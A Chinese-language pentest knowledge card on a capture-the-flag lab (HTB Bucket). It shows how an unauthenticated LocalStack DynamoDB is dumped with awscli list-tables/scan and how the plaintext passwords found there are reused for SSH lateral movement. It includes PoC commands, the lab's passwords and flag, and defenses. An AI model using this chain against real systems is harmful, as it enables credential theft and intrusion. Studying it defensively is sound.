---
id: cloud-dynamodb-unauth-scan-credential-ssh-lateral
title: DynamoDB 无鉴权：list-tables/scan 明文导出用户口令表，凭据直登 SSH 横向移动
type: scenario
domain: cloud
path: cloud
technique: dynamodb-unauth-scan-credential-lateral
tags:
- aws
- dynamodb
- localstack
- unauth
- credential-stuffing
- ssh
- lateral-movement
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-31
  verified_at: '2026-11-08T16:23:35+08:00'
  notes: 已对照原文与45张图核对：list-tables返回users、scan导出3对明文口令(Mgmt\Management@#1@#、Cloudadm\Welcome123!、Sysadm\n2vM-<_K_Q;.Aa2)、HOME=C:\Users\ADMINI~1\AppData\Local\Temp\f绕过\var\www\.aws权限错误、n2vM-<_K_Q;.Aa2登录roy成功(ssh截图)、\shell\ DynamoDB JS Shell截图与listTables输出均在；user flag 3b55b52d69515bd509b3aa744aebde7b。与S3卡为同一靶机并列链路非重复。未验证点：未复现真实AWS场景；frontmatter无sources。
url: /docs/cloud/cloud-dynamodb-unauth-scan-credential-ssh-lateral/
draft: false
kb_aliases:
- DynamoDB 未授权
- DynamoDB 凭据窃取
- LocalStack DynamoDB
---

## 一句话结论

DynamoDB 兼容端点（LocalStack 默认 4566 端口）无鉴权时，伪造凭证用 awscli `dynamodb list-tables` 列出全部表、`dynamodb scan --table-name users` 全量导出表内容，直接读出明文存储的用户名/口令，再用这些口令 SSH 登录目标用户完成横向移动——NoSQL 全表扫描即全库拖库，HTB Bucket 靶机验证（Sysadm 的口令 `n2vM-<_K_Q:.Aa2` 可 SSH 登录 roy）。

## 原理

- **入口发现**：其一，Web 服务器 `/shell/` 路径暴露 DynamoDB JavaScript Shell（AWS 官方调试界面，可直接执行 `listTables` 等任意 SDK 调用）；其二，落盘代码 `db.php`/`index.php` 中 `new DynamoDbClient(['endpoint' => 'http://localhost:4566', ...])` 暴露内部端点——拿到任意 shell 后从本机即可访问。
- **伪造凭证绕过 CLI 门槛**：awscli 必须有凭证才发请求，但服务端不校验签名，`aws configure` 填 `abcd/abcd` 即可。www-data 无 `$HOME` 写权限时报 `Permission denied: '/var/www/.aws'`，用 `mkdir /tmp/f && export HOME=/tmp/f` 让配置写入可写目录。
- **scan 即拖库**：DynamoDB 的 `Scan` 返回表内全部 item，无审计与最小权限约束（LocalStack/无鉴权端点更无任何限制）。应用用明文字符串类型（S）存储口令时，scan 输出即口令清单；`list-tables` 先枚举表名（users、alerts 等）。
- **凭据复用横向**：表内存的是系统账号口令（Mgmt/Cloudadm/Sysadm 三对），与 OS 用户口令复用。选目标（如需要 `roy` 对 `/var/www/bucket-app` 的 rwx ACL 权限）逐个尝试 `ssh roy@host`，`n2vM-<_K_Q:.Aa2` 命中——完成从"数据库读"到"操作系统身份"的转换。

## 触发条件

- DynamoDB 端点（LocalStack 4566、真实环境误绑 0.0.0.0 或 SSRF 可达）无需有效凭证即可调用；
- 表内以明文 S 类型存储口令/密钥；
- 口令与 SSH/面板等登录系统复用。

## 利用步骤

1. 获取入口：外部访问 `http://s3.bucket.htb/shell/`（DynamoDB JS Shell），或从 www-data shell 内连 `http://localhost:4566`。
2. `mkdir /tmp/f; export HOME=/tmp/f; aws configure`（abcd/abcd/us-east-1/json）解决凭证与 HOME 权限。
3. `aws --endpoint-url=http://localhost:4566 dynamodb list-tables` 得到表清单（users）。
4. `aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name users` 全量导出（3 组 username/password）。
5. 用导出口令逐个 `ssh <user>@target`，命中目标账号（roy），读取其可访问目录与 user flag。

## PoC

```bash
export HOME=/tmp/f && aws configure          # 凭证随便填
aws --endpoint-url=http://localhost:4566 dynamodb list-tables
aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name users
# {"password":{"S":"n2vM-<_K_Q:.Aa2"},"username":{"S":"Sysadm"}} ...
ssh roy@10.10.10.212   # 用 scan 导出的口令登录成功
```

无鉴权服务端不校验签名；JS Shell 中 `dynamodb.listTables({}, cb)` 等价。

## 变体与关联

- 真实 AWS 场景对应：拿到低权限 AK/SK 后对 DynamoDB 的 `dynamodb:Scan/ListTables` 权限过宽，或 SSRF 到 `dynamodb.<region>.amazonaws.com` 借元数据凭证拖表。
- 同族 NoSQL 未授权：MongoDB/Redis/CouchDB 无鉴权导出 + 口令复用横向，链路一致（换协议与客户端）。
- 数据库内容不止口令：token、API key、PII 均可直接变现。
- 关联：[[cloud-s3-unauth-endpoint-php-upload-rce]]、[[cloud-metadata-cloud-metadata-ssrf-imdsv2-token-credential]]、[[cloud-cloud-iam-s3-account-id-enumeration-assumerole-oracle]]。

## 检测与防御

- DynamoDB/LocalStack 端口只绑 127.0.0.1，绝不暴露到公网；管理界面（/shell、pynamo Studio 等）下线或加鉴权。
- 真实环境按表最小授权，禁用 `dynamodb:Scan` 全表权限，启用 CloudTrail 对 Scan/ListTables 的量级告警（一次 scan 全表导出与正常业务读模式差异巨大）。
- 数据库禁存明文口令（KMS 加密/应用层哈希），操作系统口令与库内数据隔离不复用。
- 说明：仅适用于授权测试环境。
